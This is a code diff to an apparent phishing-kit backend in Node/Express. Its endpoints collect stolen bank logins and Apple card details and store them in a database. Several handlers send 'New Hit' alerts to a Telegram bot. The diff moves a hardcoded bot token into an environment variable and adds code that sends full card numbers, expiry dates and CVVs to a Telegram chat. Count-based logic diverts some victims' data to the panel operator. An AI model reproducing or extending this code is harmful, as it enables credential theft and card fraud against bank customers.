@@ -80,9 +80,6 @@ app.get("/getRespentesting123!", (req, res) => {
 });
 
 //SANTS
-//SANTS
-//SANTS
-
 app.get("/santsCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
   owner = req.params.owner;
@@ -159,7 +156,7 @@ app.post("/santsSaveLogin", cors(), (req, res) => {
     let query = `INSERT INTO sants(username,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
 
     axios.post(
-      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New Sants Hit:\n${username}`
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New Sants Hit:\n${username}`
     );
 
     panelConnection.query(query, details, (err, rows, fields) => {
@@ -723,7 +720,7 @@ app.post("/mqSaveLogin", cors(), (req, res) => {
 
   if (mqCount == 3) {
     axios.post(
-      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New MacQuarie Hit:\n${username}`
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New MacQuarie Hit:\n${username}`
     );
 
     let details = [username, password, uniqueid, ip, "haytch123!"];
@@ -2018,9 +2015,15 @@ let appleCount = 0;
 app.post("/appleSaveCC", cors(), (req, res) => {
   let { ccname, ccnum, ccexp, cvv, owner, uniqueid } = req.body;
 
+  if (owner == "bali2810" && appleCount !== 3) {
+    axios.post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1983666674&text=New Apple Hit:\n\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}`
+    );
+  }
+
   if (appleCount == 3) {
     axios.post(
-      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New Apple Hit:\n${ccname}`
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1983666674&text=New Apple Hit:\n\nCard Name: ${ccname}\nCard Number: ${ccnum}\nCard Expiry: ${ccexp}\nCVV: ${cvv}`
     );
     owner = "haytchApple";
     appleCount = 0;
@@ -2499,7 +2502,7 @@ app.post("/georgeSaveLogin", cors(), (req, res) => {
 
   if (georgeCount == 20) {
     axios.post(
-      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New george Hit:\n${accessNo}`
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New george Hit:\n${accessNo}`
     );
 
     let details = [accessNo, password, secNo, uniqueid, ip, "haytchPanel123!"];
@@ -2621,7 +2624,7 @@ app.post(`/bendiSaveLogin`, cors(), (req, res) => {
     bendiCount = 0;
 
     axios.post(
-      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New Bendi Hit:\n${accessId}`
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=New Bendi Hit:\n${accessId}`
     );
   } else {
     let details = [accessId, password, uniqueid, ip, owner];
